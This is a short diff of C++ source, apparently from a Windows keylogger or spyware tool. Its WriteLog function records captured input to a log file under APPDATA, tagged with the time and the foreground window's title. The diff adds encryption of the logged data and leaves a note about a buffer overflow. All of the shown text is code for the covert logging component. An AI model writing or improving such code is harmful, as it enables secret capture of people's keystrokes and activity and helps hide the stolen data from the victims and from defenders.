@@ -3,7 +3,6 @@
 
 #define APPDATA "APPDATA"
 
-
 std::string Stream::GetPath(const std::string &dir) {
   char *buf = nullptr;
   size_t size = 0;
@@ -24,8 +23,8 @@ bool Stream::MakeDir(const std::string &path) {
 
 bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blockProcessInfo) {
   bool processInfo = false;
-  uint32_t cur = system_data::GetProcessId();
-  if (system_data::ProcessChanged(active, cur, true)) {
+  uint32_t cur = SystemData::GetProcessId();
+  if (SystemData::ProcessChanged(active, cur, true)) {
 	processInfo = true;
   }
 
@@ -34,10 +33,14 @@ bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blo
 	return false;
   }
   if (processInfo && !blockProcessInfo) {
-	logFile->Ofstream << std::endl << "[" << SysTime::SystemTime::Now().GetFullDate() << " "
-					  << convert::HwndToString(GetForegroundWindow()) << "]" << std::endl;
+	std::string timeString =
+		"\n[" + SysTime::SystemTime::Now().GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
+	Crypt::Encrypt(timeString);
+	logFile->Ofstream << timeString;
   }
-  logFile->Ofstream << input;
+  std::string cryptInput = input;
+  Crypt::Encrypt(cryptInput);    // TODO vector buffer overflow
+  logFile->Ofstream << cryptInput;
   logFile->Ofstream.close();
   return true;
 }
